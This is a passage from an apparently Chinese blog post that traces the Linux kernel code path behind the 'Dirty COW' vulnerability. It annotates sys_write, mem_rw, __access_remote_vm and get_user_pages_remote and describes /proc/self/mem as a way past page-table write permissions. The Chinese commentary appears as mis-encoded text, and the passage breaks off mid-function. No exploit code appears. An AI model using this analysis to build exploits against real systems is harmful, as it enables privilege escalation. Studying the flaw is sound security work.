<h2 id="COWå’Œç¼ºé¡µå¼‚å¸¸ç›¸å…³æµç¨‹"><a href="#COWå’Œç¼ºé¡µå¼‚å¸¸ç›¸å…³æµç¨‹" class="headerlink" title="COWå’Œç¼ºé¡µå¼‚å¸¸ç›¸å…³æµç¨‹"></a>COWå’Œç¼ºé¡µå¼‚å¸¸ç›¸å…³æµç¨‹</h2><h3 id="writeã®æ‰§è¡Œæµ"><a href="#writeã®æ‰§è¡Œæµ" class="headerlink" title="writeã®æ‰§è¡Œæµ"></a>writeã®æ‰§è¡Œæµ</h3><p>é¦–å…ˆå…ˆæ¥äº†è§£ä¸€ä¸‹ç³»ç»Ÿè°ƒç”¨<code>write</code>çš„æ‰§è¡Œæµ</p>
<h4 id="sys-write"><a href="#sys-write" class="headerlink" title="sys_write"></a>sys_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs C">SYSCALL_DEFINE3(write, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, buf,<br>		<span class="hljs-type">size_t</span>, count)<br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span> =</span> fdget_pos(fd);<span class="hljs-comment">//æ ¹æ®fdæ‰¾åˆ°å¯¹åº”çš„æ–‡ä»¶å¯¹è±¡å’Œæ ‡å¿—</span><br>	<span class="hljs-type">ssize_t</span> ret = -EBADF;<br><br>	<span class="hljs-keyword">if</span> (f.file) &#123;<br>		<span class="hljs-type">loff_t</span> pos = file_pos_read(f.file); 		<span class="hljs-comment">//è¯»å–æ–‡ä»¶å¯¹è±¡çš„ä½ç½®æŒ‡é’ˆ</span><br>		ret = vfs_write(f.file, buf, count, &amp;pos);	<span class="hljs-comment">//é€šè¿‡è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿæ–‡ä»¶çš„å†™æ“ä½œ</span><br>		<span class="hljs-keyword">if</span> (ret &gt;= <span class="hljs-number">0</span>)<br>			file_pos_write(f.file, pos);		   <span class="hljs-comment">//è®¾ç½®æ–‡ä»¶å¯¹è±¡çš„ä½ç½®æŒ‡é’ˆ</span><br>		fdput_pos(f);							  <span class="hljs-comment">//é‡Šæ”¾è¿™ä¸ªå¯¹è±¡çš„å¼•ç”¨</span><br>	&#125;<br><br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs SCSS"><span class="hljs-built_in">sys_write</span>()<br>	<span class="hljs-built_in">vfs_write</span>()<br>		<span class="hljs-built_in">__vfs_write</span>()<br>			file-&gt;f_op-&gt;<span class="hljs-built_in">write</span>()<span class="hljs-comment">//è¯¥æ–‡ä»¶äºå†…æ ¸ä¸­çš„æ–‡ä»¶æè¿°ç¬¦çš„file_operationsç»“æ„ä½“ï¼Œç±»ä¼¼äºä¸€å¼ å‡½æ•°è¡¨ï¼Œå‚¨å­˜äº†é»˜è®¤çš„å¯¹äºä¸€äº›ç³»ç»Ÿè°ƒç”¨çš„å¤„ç†å‡½æ•°æŒ‡é’ˆ</span><br></code></pre></td></tr></table></figure>

<h3 id="proc-self-memï¼šç»•è¿‡é¡µè¡¨é¡¹æƒé™"><a href="#proc-self-memï¼šç»•è¿‡é¡µè¡¨é¡¹æƒé™" class="headerlink" title="&#x2F;proc&#x2F;self&#x2F;memï¼šç»•è¿‡é¡µè¡¨é¡¹æƒé™"></a>&#x2F;proc&#x2F;self&#x2F;memï¼šç»•è¿‡é¡µè¡¨é¡¹æƒé™</h3><p>â€œè„ç‰›â€é€šå¸¸åˆ©ç”¨çš„æ˜¯ <code>/proc/self/mem</code> è¿›è¡Œè¶Šæƒå†™å…¥ï¼Œè¿™ä¹Ÿæ˜¯æ•´ä¸ªâ€œè„ç‰›â€åˆ©ç”¨ä¸­è¾ƒä¸ºæ ¸å¿ƒçš„æµç¨‹</p>
<p>å¯¹äº<code>/proc/self/mem</code>è¿™ä¸ªæ–‡ä»¶å¯¹è±¡æ¥è¯´, ä¼šè°ƒç”¨<code>mem_write()</code>å‡½æ•°</p>
<h4 id="mem-write"><a href="#mem-write" class="headerlink" title="mem_write()"></a>mem_write()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">mem_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buf,</span><br><span class="hljs-params">			 <span class="hljs-type">size_t</span> count, <span class="hljs-type">loff_t</span> *ppos)</span><br>&#123;<br>	<span class="hljs-keyword">return</span> mem_rw(file, (<span class="hljs-type">char</span> __user*)buf, count, ppos, <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>mem_write</code>è°ƒç”¨<code>mem_rw</code></p>
<h4 id="mem-rw"><a href="#mem-rw" class="headerlink" title="mem_rw()"></a>mem_rw()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">mem_rw</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-comment">//è¦è¯»/å†™çš„æ–‡ä»¶</span></span><br><span class="hljs-params">                      <span class="hljs-type">char</span> __user *buf,	 <span class="hljs-comment">//ç”¨æˆ·ç©ºé—´ç¼“å†²åŒº</span></span><br><span class="hljs-params">					<span class="hljs-type">size_t</span> count, 	   <span class="hljs-comment">//è¯»/å†™é•¿åº¦</span></span><br><span class="hljs-params">                      <span class="hljs-type">loff_t</span> *ppos, 	 <span class="hljs-comment">//å¼€å§‹çš„åœ°æ–¹</span></span><br><span class="hljs-params">                      <span class="hljs-type">int</span> write)</span>		 <span class="hljs-comment">//è¯»/å†™</span><br>&#123;<br>    <span class="hljs-comment">//æ ¹æ®/proc/self/memè¿™ä¸ªæ–‡ä»¶å¯¹è±¡çš„ç§æœ‰æ•°æ®åŒºåŸŸ, æ‰¾åˆ°å…¶æ˜ å°„çš„æ˜¯å“ªä¸€ä¸ªè™šæ‹Ÿåœ°å€ç©ºé—´, ç„¶ååœ¨å†…æ ¸ä¸­ç”³è¯·äº†ä¸€ä¸ªä¸´æ—¶é¡µä½œä¸ºå†…æ ¸ç¼“å†²åŒº</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> file-&gt;private_data;	<span class="hljs-comment">//memæ–‡ä»¶çš„ç§æœ‰æ•°æ®åŒºåŸŸæŒ‡å‘å¯¹åº”çš„è™šæ‹Ÿå†…å­˜ç©ºé—´</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr = *ppos;			<span class="hljs-comment">//åç§»ï¼Œmmä¸­è¦è¯»å†™çš„åœ°å€</span><br>	<span class="hljs-type">ssize_t</span> copied;<br>	<span class="hljs-type">char</span> *page;<br><br>	<span class="hljs-keyword">if</span> (!mm)<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>	page = (<span class="hljs-type">char</span> *)__get_free_page(GFP_TEMPORARY);		<span class="hljs-comment">//è·å–ä¸€ä¸ªä¸´æ—¶é¡µï¼Œsys_writeé™åˆ¶æœ€å¤šå†™ä¸€é¡µ</span><br>	<span class="hljs-keyword">if</span> (!page)<br>		<span class="hljs-keyword">return</span> -ENOMEM;<br><br>	copied = <span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">if</span> (!atomic_inc_not_zero(&amp;mm-&gt;mm_users))		<span class="hljs-comment">//å¢åŠ ä¸€ä¸ªå¼•ç”¨</span><br>		<span class="hljs-keyword">goto</span> <span class="hljs-built_in">free</span>;<br>	<span class="hljs-comment">//é€šè¿‡ä¸€ä¸ªå¾ªç¯å†™å…¥counté•¿æ•°æ®, copy_from_useræŠŠæ•°æ®æ¬è¿åˆ°å†…æ ¸ç¼“å†²åŒºä¸­, å†è°ƒç”¨access_remote_vm()å†™å…¥è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­</span><br>	<span class="hljs-keyword">while</span> (count &gt; <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">//countè¡¨ç¤ºå‰©ä½™è¦å†™å…¥çš„é•¿åº¦</span><br>		<span class="hljs-type">int</span> this_len = <span class="hljs-type">min_t</span>(<span class="hljs-type">int</span>, count, PAGE_SIZE);	<span class="hljs-comment">//æœ¬æ¬¡å†™å…¥å¤šå°‘</span><br>		<span class="hljs-comment">//æŠŠdataä»ç”¨æˆ·ç©ºé—´bufå¤åˆ¶åˆ°å†…æ ¸çš„ä¸´æ—¶é¡µ</span><br>		<span class="hljs-keyword">if</span> (write &amp;&amp; copy_from_user(page, buf, this_len)) &#123;<br>			copied = -EFAULT;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>		<span class="hljs-comment">//è¯»å†™åˆ«äººçš„è™šæ‹Ÿåœ°å€ç©ºé—´</span><br>		this_len = access_remote_vm(mm, addr, page, this_len, write);<br>		<span class="hljs-keyword">if</span> (!this_len) &#123;<br>			<span class="hljs-keyword">if</span> (!copied)<br>				copied = -EIO;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>		<span class="hljs-comment">//è¯»å–ï¼ŒæŠŠå†…æ ¸è¯»åˆ°çš„æ•°æ®å¤åˆ¶åˆ°ç”¨æˆ·buf</span><br>		<span class="hljs-keyword">if</span> (!write &amp;&amp; copy_to_user(buf, page, this_len)) &#123;<br>			copied = -EFAULT;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br><br>		buf += this_len;	<span class="hljs-comment">//	ç”¨æˆ·ç¼“å†²åŒº</span><br>		addr += this_len;	<span class="hljs-comment">//è¯»å†™åœ°å€</span><br>		copied += this_len;	<span class="hljs-comment">//è¯»å†™äº†å¤šå°‘å­—èŠ‚</span><br>		count -= this_len;	<span class="hljs-comment">//è¿˜å‰©å¤šå°‘å­—èŠ‚</span><br>	&#125;<br>	*ppos = addr;<br><br>	mmput(mm);<br><span class="hljs-built_in">free</span>:<br>	free_page((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page);<br>	<span class="hljs-keyword">return</span> copied;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>access_remote_vm()</code>æ˜¯å¯¹<code>__access_remote_vm</code>çš„åŒ…è£…</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">access_remote_vm</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mm_struct *mm, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr,</span><br><span class="hljs-params">		<span class="hljs-type">void</span> *buf, <span class="hljs-type">int</span> len, <span class="hljs-type">int</span> write)</span><br>&#123;<br>	<span class="hljs-keyword">return</span> __access_remote_vm(<span class="hljs-literal">NULL</span>, mm, addr, buf, len, write);<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="access-remote-vm"><a href="#access-remote-vm" class="headerlink" title="__access_remote_vm()"></a>__access_remote_vm()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Access another process&#x27; address space as given in mm.  If non-NULL, use the</span><br><span class="hljs-comment"> * given task for page fault accounting.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//è®¿é—®mmæŒ‡å‘çš„å…¶ä»–è¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œå¦‚æœtskéNULLï¼Œåˆ™ç”¨æ¥è¿›è¡Œç¼ºé¡µå¼‚å¸¸è®¡æ•°</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __access_remote_vm(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> mm_struct *mm,<br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">void</span> *buf, <span class="hljs-type">int</span> len, <span class="hljs-type">int</span> write)<br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span>;</span><br>	<span class="hljs-type">void</span> *old_buf = buf;<br><br>	down_read(&amp;mm-&gt;mmap_sem);<span class="hljs-comment">//è·å–mmap_semä¿¡å·é‡</span><br>	<span class="hljs-comment">/* ignore errors, just check how much was successfully transferred */</span><br>	<span class="hljs-keyword">while</span> (len) &#123;<span class="hljs-comment">//å¾ªç¯ï¼Œç›´åˆ°å†™å…¥lené•¿åº¦</span><br>		<span class="hljs-type">int</span> bytes, ret, offset;<br>		<span class="hljs-type">void</span> *maddr;<br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> <span class="hljs-literal">NULL</span>;<br>		<span class="hljs-comment">//æŠŠè¦è®¿é—®çš„å…¶ä»–è¿›ç¨‹çš„é¡µé¢é”å®šåœ¨å†…å­˜ä¸­ï¼Œé¿å…ç¼ºé¡µå¼‚å¸¸ï¼Œè¿™é‡Œåªè·å–1é¡µï¼Œpageå°±æ˜¯é”å®šçš„é‚£ä¸€é¡µ</span><br>		ret = get_user_pages_remote(tsk, mm, addr, <span class="hljs-number">1</span>,<br>				write, <span class="hljs-number">1</span>, &amp;page, &amp;vma);<br>		<span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">0</span>) &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_HAVE_IOREMAP_PROT</span><br>			<span class="hljs-keyword">break</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>			<span class="hljs-comment">/*</span><br><span class="hljs-comment">			 * Check if this is a VM_IO | VM_PFNMAP VMA, which</span><br><span class="hljs-comment">			 * we can access using slightly different code.</span><br><span class="hljs-comment">			 */</span><br>			vma = find_vma(mm, addr);<br>			<span class="hljs-keyword">if</span> (!vma || vma-&gt;vm_start &gt; addr)<br>				<span class="hljs-keyword">break</span>;<br>			<span class="hljs-keyword">if</span> (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;access)<br>				ret = vma-&gt;vm_ops-&gt;access(vma, addr, buf,<br>							  len, write);<br>			<span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">0</span>)<br>				<span class="hljs-keyword">break</span>;<br>			bytes = ret;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			bytes = len;		<span class="hljs-comment">//è¦å†™å…¥çš„é•¿åº¦</span><br>			offset = addr &amp; (PAGE_SIZE<span class="hljs-number">-1</span>);	<span class="hljs-comment">//addrçš„é¡µå†…åç§»</span><br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">            	bytes+offset &lt;= PAGE_SIZE</span><br><span class="hljs-comment">            	=&gt;å†™å…¥é•¿åº¦+é¡µå†…åç§»&lt;=PAGE_SIZE</span><br><span class="hljs-comment">            	=&gt;é”å®šæ˜¯é¡µä¸ºå•ä½çš„ï¼Œå› æ­¤ä¸èƒ½è·¨é¡µå†™å…¥</span><br><span class="hljs-comment">            */</span><br>			<span class="hljs-keyword">if</span> (bytes &gt; PAGE_SIZE-offset)<br>				bytes = PAGE_SIZE-offset;<br>			<span class="hljs-comment">//æ­¤æ—¶çš„pageä¸ºget_user_pages_remote()ä¸ºç”¨æˆ·å¯»æ‰¾çš„ï¼Œæ˜¯è¢«é”å®šåœ¨å†…å­˜ä¸­çš„é¡µï¼Œkmapå°†å…¶æ˜ å°„åœ¨å†…æ ¸åœ°å€ç©ºé—´ä¸­</span><br>			maddr = kmap(page);<br>			<span class="hljs-keyword">if</span> (write) &#123;	<span class="hljs-comment">//å†™å…¥è¯·æ±‚</span><br>                <span class="hljs-comment">/*</span><br><span class="hljs-comment">                	å…ˆè°ƒç”¨copy_to_user_page()è¿›è¡Œå†™å…¥</span><br><span class="hljs-comment">                	maddrä¸ºæ ¹æ®addré”å®šçš„é¡µï¼Œoffsetä¸ºaddré¢é¡µå†…åç§»ï¼Œä¸¤è€…ç›¸åŠ å°±æ˜¯è¦å†™å…¥çš„åœ°å€</span><br><span class="hljs-comment">                	ç­‰ä»·ä¸ºï¼šmemcpy(maddr + offset, buf, bytes)</span><br><span class="hljs-comment">                */</span><br>				copy_to_user_page(vma, page, addr,<br>						  maddr + offset, buf, bytes);<br>                <span class="hljs-comment">//æ ‡è®°ä¸ºè„é¡µ</span><br>				set_page_dirty_lock(page);<br>			&#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">//ç­‰ä»·ï¼šmemcpy(buf, maddr+offset, bytes)</span><br>				copy_from_user_page(vma, page, addr,<br>						    buf, maddr + offset, bytes);<br>			&#125;<br>			kunmap(page);<br>			put_page(page);<span class="hljs-comment">//é‡Šæ”¾</span><br>		&#125;<br>		len -= bytes;<br>		buf += bytes;<br>		addr += bytes;<br>	&#125;<br>	up_read(&amp;mm-&gt;mmap_sem);<br><br>	<span class="hljs-keyword">return</span> buf - old_buf;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‡½æ•°çš„æ ¸å¿ƒå°±åœ¨ä¸æ€ä¹ˆæŠŠåˆ«çš„è¿›ç¨‹çš„é¡µé¢é”å®šåœ¨å†…å­˜ä¸­çš„, å› æ­¤<code>get_user_pages_remote()</code>æ˜¯<code>__access_remote_vm()</code>çš„æ ¸å¿ƒå‡½æ•°</p>
<h4 id="get-user-pages-remote"><a href="#get-user-pages-remote" class="headerlink" title="get_user_pages_remote()"></a>get_user_pages_remote()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * get_user_pages_remote() - pin user pages in memory</span><br><span class="hljs-comment"> * @tsk:	the task_struct to use for page fault accounting, or</span><br><span class="hljs-comment"> *		NULL if faults are not to be recorded.</span><br><span class="hljs-comment"> * @mm:		mm_struct of target mm</span><br><span class="hljs-comment"> * @start:	starting user address</span><br><span class="hljs-comment"> * @nr_pages:	number of pages from start to pin</span><br><span class="hljs-comment"> * @write:	whether pages will be written to by the caller</span><br><span class="hljs-comment"> * @force:	whether to force access even when user mapping is currently</span><br><span class="hljs-comment"> *		protected (but never forces write access to shared mapping).</span><br><span class="hljs-comment"> * @pages:	array that receives pointers to the pages pinned.</span><br><span class="hljs-comment"> *		Should be at least nr_pages long. Or NULL, if caller</span><br><span class="hljs-comment"> *		only intends to ensure the pages are faulted in.</span><br><span class="hljs-comment"> * @vmas:	array of pointers to vmas corresponding to each page.</span><br><span class="hljs-comment"> *		Or NULL if the caller does not require them.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Returns number of pages pinned. This may be fewer than the number</span><br><span class="hljs-comment"> * requested. If nr_pages is 0 or negative, returns 0. If no pages</span><br><span class="hljs-comment"> * were pinned, returns -errno. Each page returned must be released</span><br><span class="hljs-comment"> * with a put_page() call when it is finished with. vmas will only</span><br><span class="hljs-comment"> * remain valid while mmap_sem is held.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Must be called with mmap_sem held for read or write.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * get_user_pages walks a process&#x27;s page tables and takes a reference to</span><br><span class="hljs-comment"> * each struct page that each user address corresponds to at a given</span><br><span class="hljs-comment"> * instant. That is, it takes the page that would be accessed if a user</span><br><span class="hljs-comment"> * thread accesses the given user virtual address at that instant.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This does not guarantee that the page exists in the user mappings when</span><br><span class="hljs-comment"> * get_user_pages returns, and there may even be a completely different</span><br><span class="hljs-comment"> * page there in some cases (eg. if mmapped pagecache has been invalidated</span><br><span class="hljs-comment"> * and subsequently re faulted). However it does guarantee that the page</span><br><span class="hljs-comment"> * won&#x27;t be freed completely. And mostly callers simply care that the page</span><br><span class="hljs-comment"> * contains data that was valid *at some point in time*. Typically, an IO</span><br><span class="hljs-comment"> * or similar operation cannot guarantee anything stronger anyway because</span><br><span class="hljs-comment"> * locks can&#x27;t be held over the syscall boundary.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If write=0, the page must not be written to. If the page is written to,</span><br><span class="hljs-comment"> * set_page_dirty (or set_page_dirty_lock, as appropriate) must be called</span><br><span class="hljs-comment"> * after the page is finished with, and before put_page is called.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * get_user_pages is typically used for fewer-copy IO operations, to get a</span><br><span class="hljs-comment"> * handle on the memory by some means other than accesses via the user virtual</span><br><span class="hljs-comment"> * addresses. The pages may be submitted for DMA to devices or accessed via</span><br><span class="hljs-comment"> * their kernel linear mapping (via the kmap APIs). Care should be taken to</span><br><span class="hljs-comment"> * use the correct cache flushing APIs.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * See also get_user_pages_fast, for performance critical applications.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * get_user_pages should be phased out in favor of</span><br><span class="hljs-comment"> * get_user_pages_locked|unlocked or get_user_pages_fast. Nothing</span><br><span class="hljs-comment"> * should use get_user_pages because it cannot pass</span><br><span class="hljs-comment"> * FAULT_FLAG_ALLOW_RETRY to handle_mm_fault.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">	get_user_pages_remote()-æŠŠç”¨æˆ·é¡µé¢é”å®šåœ¨å†…å­˜ä¸­</span><br><span class="hljs-comment">	@tskï¼šç”¨äºè¿›è¡Œç¼ºé¡µå¼‚å¸¸è®¡æ•°çš„ä»»åŠ¡æè¿°ç¬¦ï¼Œå¦‚æœæ˜¯NULLçš„è¯å°±ä¸è¿›è¡Œè®°æ•°</span><br><span class="hljs-comment">	@mmï¼šç›®æ ‡è™šæ‹Ÿå†…å­˜ç©ºé—´</span><br><span class="hljs-comment">	@startï¼šèµ·å§‹ç”¨æˆ·åœ°å€</span><br><span class="hljs-comment">	@nr_pagesï¼šä»startå¼€å§‹è¦é”å®šå¤šå°‘é¡µé¢</span><br><span class="hljs-comment">	@writeï¼šè¿™äº›è¦é”å®šçš„é¡µé¢æ˜¯å¦éœ€è¦è¢«å†™å…¥</span><br><span class="hljs-comment">	@forceï¼šå½“ç”¨æˆ·æ˜ å°„æ­£åœ¨è¢«ä¿æŠ¤æ—¶ï¼Œç”¨äºå­˜æ”¾æŒ‡å‘è¢«é”å®šçš„pagesçš„æŒ‡é’ˆ</span><br><span class="hljs-comment">	@vmsï¼šä¸€ä¸ªVMAæŒ‡é’ˆæ•°ç»„ï¼Œç”¨äºå­˜æ”¾æ¯ä¸€ä¸ªé¡µé¢å¯¹åº”çš„VMAå¯¹è±¡</span><br><span class="hljs-comment">	</span><br><span class="hljs-comment">	è¿”å›è¢«é”å®šçš„é¡µé¢æ•°é‡ï¼Œæœ‰å¯èƒ½æ¯”è¯·æ±‚çš„å°‘ï¼Œå¦‚æœæ˜¯0æˆ–è€…è´Ÿæ•°ï¼Œå°±è¡¨ç¤ºå‡ºé”™äº†</span><br><span class="hljs-comment">	pagesä¸­è¿”å›çš„æ¯ä¸€ä¸ªé¡µé¢éƒ½å¿…é¡»é€šè¿‡put_page()è¿›è¡Œé‡Šæ”¾</span><br><span class="hljs-comment">	vmasä¸­çš„æŒ‡é’ˆä¼šä¸€ç›´æœ‰æ•ˆï¼Œç›´åˆ°mmap_semè¢«é‡Šæ”¾</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">get_user_pages_remote</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> mm_struct *mm,</span><br><span class="hljs-params">		<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_pages,</span><br><span class="hljs-params">		<span class="hljs-type">int</span> write, <span class="hljs-type">int</span> force, <span class="hljs-keyword">struct</span> page **pages,</span><br><span class="hljs-params">		<span class="hljs-keyword">struct</span> vm_area_struct **vmas)</span><br>&#123;<br>	<span class="hljs-keyword">return</span> __get_user_pages_locked(tsk, mm, start, 